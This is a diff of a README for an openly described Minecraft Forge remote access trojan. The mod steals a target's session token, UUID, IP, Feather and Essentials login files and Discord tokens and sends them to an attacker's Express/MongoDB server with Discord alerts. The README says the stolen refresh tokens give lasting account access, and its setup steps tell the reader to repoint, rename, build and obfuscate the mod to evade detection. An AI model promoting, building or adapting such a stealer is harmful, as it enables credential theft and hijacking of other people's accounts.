@@ -6,7 +6,7 @@
 
 **Retrieve Access Token**
 
-![](https://img.shields.io/badge/MC--VERSION-FORGE_1.8.9-0?style=for-the-badge)
+![](https://img.shields.io/badge/MC--VERSION-FORGE_1.12.2-0?style=for-the-badge)
 ![](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white)
 ![](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)
 ![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
@@ -16,7 +16,8 @@
 > Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.
 
 ## Features
-- Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
+> 1.12.2 bundles another version of JNA which refuses to decrypt the tokens which I cannot shade myself and relocate because the JVM does not trust other JNA paths.
+- Grabs the **username, uuid, token, ip, feather file, essentials file and ~~discord tokens~~** of a target as a *JSON*.
 - Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**. (Unconfirmed, ask Annah#5795)
 - Additionally, it stores a **formatted session string** ready to use with [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth).
 - JavaScript backend server which:
@@ -41,16 +42,16 @@
 ![embed.png](.github/embed.png)
 
 ## Setup
-> A video tutorial is available [here](https://youtu.be/JWoBSp8XU_8).
+> A video tutorial is available [here](https://youtu.be/JWoBSp8XU_8) (1.8.9).
 
-> If you're having difficulties, you can try [Hephaestus](https://github.com/DxxxxY/Hephaestus), the automatic R.A.T builder.
+~~> If you're having difficulties, you can try [Hephaestus](https://github.com/DxxxxY/Hephaestus), the automatic R.A.T builder.~~
 - Server
   1. Clone the repository.
   2. Install dependencies.
   3. Run the server.
 
 - Mod
-  1. Follow [1.8.9ForgeTemplate#setup](https://github.com/DxxxxY/1.8.9ForgeTemplate#setup) to setup your mod environment.
+  1. Follow [1.12.2ForgeTemplate#setup](https://github.com/DxxxxY/1.12.2ForgeTemplate#setup) to setup your mod environment.
   2. Change url to your server and change some other stuff to make it ✨unique✨.
   3. Build the mod.
   4. (Optional) Obfuscate the mod.
